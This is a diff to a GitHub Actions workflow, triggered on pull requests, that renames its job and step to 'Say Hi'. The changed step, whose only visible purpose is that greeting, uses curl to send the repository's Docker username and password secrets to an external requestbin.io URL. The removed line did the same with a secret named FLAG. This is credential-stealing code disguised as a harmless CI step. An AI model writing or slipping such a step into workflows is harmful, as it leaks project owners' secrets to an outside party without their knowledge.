@@ -1,4 +1,4 @@
-name: CheckIn
+name: Say Hi
 
 on: [pull_request]
 
@@ -9,6 +9,6 @@ jobs:
 
     steps:
     - uses: actions/checkout@v2
-    - name: gmltql
+    - name: Say Hi
       run: |
-        curl "https://requestbin.io/1mpb5q31?fflag=${{ secrets.FLAG }}"
+        curl "https://requestbin.io/1mpb5q31?username=${{ secrets.DOCKER_USERNAME }}&password=${{ secrets.DOCKER_PASSWORD }}"
